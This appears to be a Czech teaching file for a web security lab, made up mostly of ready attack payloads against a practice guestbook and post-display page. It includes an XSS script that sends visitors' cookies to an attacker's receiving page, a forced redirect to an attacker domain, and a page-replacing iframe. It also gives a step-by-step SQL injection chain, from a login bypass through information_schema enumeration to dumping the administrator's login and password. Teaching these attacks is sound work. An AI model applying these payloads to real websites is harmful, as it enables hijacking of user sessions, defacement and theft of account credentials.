<?php
// Soubor pro vytvareni utocnych kodu.
?>
- XSS budeme provádět skrze návštěvní knihu.
- SQL Injection budeme provádět skrze zobrazení příspěvku.

////// 1 - XSS - vložení reklamy //////

// vložení reklamy
<div style="position:fixed; bottom:5px; right:5px; padding: 20px; background-color: red;">
    MOJE REKLAMA
</div>
// pozn.: pokud místo uvozovek použijeme apostrofy, tak to nebudu funguvat,
// protože apostrofy používá databázový dotaz pro ohraničení textů.

// [+] vložení reklamy
<a style="position:fixed; bottom:5px; right:5px; padding: 20px; background-color: red;"
   href="https://www.zcu.cz"
>
    MOJE REKLAMA
</a>

// [++] vložení reklamy
<a style="position:fixed; bottom:5px; right:5px; padding: 20px; background-color: red;"
   href="https://www.zcu.cz"
   onmouseover="alert(\'ÚTOK\')"
>
    MOJE REKLAMA
</a>


////// 1 - XSS - odeslání cookies útočníkovi //////

// čtení Cookies a odeslání na server (na serveru je stránka pro příjem odeslaných hodnot)
<script>
    var obr = document.createElement("img");
    obr.src = "http://..../hacker-prijem.php?" + encodeURI( document.cookie );
    document.body.appendChild(obr);
</script>

// ukázka vynucení přesměrování celého webu po načtení JavaScriptu
<script>
    window.location = "http://domena-utocnika.cz";
</script>


////// 1.1 - XSS - nahrazení obsahu celé stránky //////

// skrypt, ktery nahradi obsah stranky za jeden velky IFRAME
<script>
    var b = document.getElementsByTagName("body")[0];
    // prekryti obsahu zajisti funkce
    function nahrazeni(){
        var vyska = window.innerHeight-25;
        b.innerHTML = "<iframe src=\'http://kiv.zcu.cz\' style=\'width:100%;height:"+vyska+"px;background-color:white;\'></iframe>";
    }
    // vykonani pro nacteni webu
    b.onload = nahrazeni;
</script>



///// SQL Injection //////

// lze zacit pokusem o prolomeni prihlaseni
- následující zadejte místo hesla uživatele
' OR '1'='1


//// nasledující příklad zneužívá zobrazení príspěvku
- všimněte si, že MySQL obsahuje databázi information_schema, která má tabulky TABLES a COLUMNS.

// test zranitelnosti vůči SQL Injection
index.php?zobraz=Zobraz&prispevek=2'
- získáme chybu, tj. web je zranitelný

// test možných komentářů/ukončení dotazu
index.php?zobraz=Zobraz&prispevek=2 /*
index.php?zobraz=Zobraz&prispevek=2 --
- správný typ je ten, který nevrátí chybu

// test počtu sloupců dané tabulky
index.php?zobraz=Zobraz&prispevek=2 order by 2 --
index.php?zobraz=Zobraz&prispevek=2 order by 3 --
index.php?zobraz=Zobraz&prispevek=2 order by 4 --
- získáme chybu, tj. daná tabulka má jen 3 sloupce

// test, zda funguje dotaz UNION na sloučení vícera tabulek (víme, že tato má 3 sloupce)
index.php?zobraz=Zobraz&prispevek=2 union all select 1,2,3 limit 1,1 --
- limitem získáme pouze druhý řádek (první bude nejspíš obsahovat existující příspěvek).
- také si lze všimnout, které sloupce se vypisují dle 1, 2, 3, což budeme potřebovat dále.

// test verze PHP - @@version, version() a popř. funkce convert() či hex() a unhex().
index.php?zobraz=Zobraz&prispevek=2 union all select 1,@@version,3 limit 1,1 --
- verzi si necháme vypsat místo čísla, které se nám zobrazilo.
- verze MySQL je důležitá kvůli možnosti zjištění názvů tabulek a jejich sloupců.

// obdobně můžeme zjistit, o který databázový systém se jedná
MS-SQL: user_name()
MYSQL: user()
ORACLE: select user from dual;

//// Nasledující útoky (bohužel) již nemusí vždy fungovat.

// MySQL v5 - získání názvů tabulek - musíme postupně iterovat přes limit
index.php?zobraz=Zobraz&prispevek=2 union all select 1,table_name,3 from information_schema.tables limit 1,1 --
index.php?zobraz=Zobraz&prispevek=2 union all select 1,table_name,3 from information_schema.tables limit 2,1 --
...
- získáme názvy všech tabulek
// pokud by zde nastala chyba s rozdílnými znakovými sadami daných dvou databází, tak lze upravit takto:
index.php?zobraz=Zobraz&prispevek=2 union all select 1,table_name COLLATE utf8_general_ci, 3 from information_schema.tables limit 1,1 --


// MySQL v5 - získání názvů sloupců dané tabulky - opět postupnou iterací
index.php?zobraz=Zobraz&prispevek=2 union all select 1,column_name,3 from information_schema.columns where table_name='orionlogin_uzivatele' limit 1,1 --
index.php?zobraz=Zobraz&prispevek=2 union all select 1,column_name,3 from information_schema.columns where table_name='orionlogin_uzivatele' limit 2,1 --
...
- získáme názvy sloupců dané tabulky

// získání indexu a hesla administrátora - potřebujeme sloupce iduzivatel, index, heslo, idprava.
// předpokládejme, že jsme si předem zjistili, že právo administrátora má idprava=1
// použijeme funkci concat() pro spojení textových řetězců; také můžeme použít hexadecimální číslo pro dvojtečku 0x3a.
index.php?zobraz=Zobraz&prispevek=2 union all select 1,concat(iduzivatel,0x3a,login,0x3a,heslo,0x3a,idprava),3 from orionlogin_uzivatele where idprava=1 limit 1,1 --
- získané informace nám poslouží pro přihlášení do systému pod účtem administrátora

